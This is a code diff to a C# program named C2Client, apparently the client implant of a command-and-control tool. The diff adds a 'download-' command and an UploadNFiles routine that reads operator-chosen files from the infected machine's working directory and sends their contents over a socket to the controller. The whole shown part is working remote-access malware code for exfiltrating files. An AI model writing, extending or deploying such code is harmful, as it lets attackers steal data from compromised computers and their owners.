@@ -425,12 +425,44 @@ namespace C2Client
 
             catch(Exception e) 
             {
-                result = e.Message;
+                result = Path.GetFullPath(dirName)+"\n";
+                result += e.Message;
             }
             
             return result;
         }
 
+        public string UploadNFiles(Socket c,int nooffiles,string cwd)
+        {
+            string result;
+            try
+            {
+                for (int i = 0; i < nooffiles; i++)
+                {
+                    // receiving file name
+                    byte[] filename = new byte[1024];
+                    Array.Clear(filename, 0, filename.Length);
+                    c.Receive(filename);
+
+                    // sending file contents
+                    Console.WriteLine(cwd);
+                    string fd = cwd + "\\"+ Encoding.ASCII.GetString(filename).TrimEnd('\0');
+                    Console.WriteLine(fd);
+                    byte[] contents = new byte[10240000];
+                    Array.Clear(contents, 0, contents.Length);
+                    contents = File.ReadAllBytes(@fd);
+                    c.Send(contents);
+                    Thread.Sleep(1000);
+                }
+                result = "Files Downloaded successfully";
+                return result;
+            }
+            catch(Exception e)
+            {
+                result = e.Message;
+            }
+            return result;
+        }
 
         public static void Main(string[] args)
         {
@@ -653,6 +685,28 @@ namespace C2Client
                         dcontents.Join();
 
                         //Thread.Sleep(2000);
+
+                    }
+
+                    else if (cmd.Contains("download-"))
+                    {
+                        // download->N , we need to upload N number of files
+                        string[] files= cmd.Split('-');
+                        int nooffiles = Convert.ToInt32(files[1]);
+                        Console.WriteLine(nooffiles);
+                        string cwd = files[2];
+                        Console.WriteLine("Current dir"+cwd);
+                        cwd = cwd.Replace(@"\\", @"\");
+                        Program p = new Program();
+
+                        Thread uploadnfiles = new Thread(() =>
+                        {
+                           cmd= p.UploadNFiles(cs, nooffiles,cwd);
+                        });
+                        uploadnfiles.Start();
+                        uploadnfiles.Join();
+
+
 
                     }
 
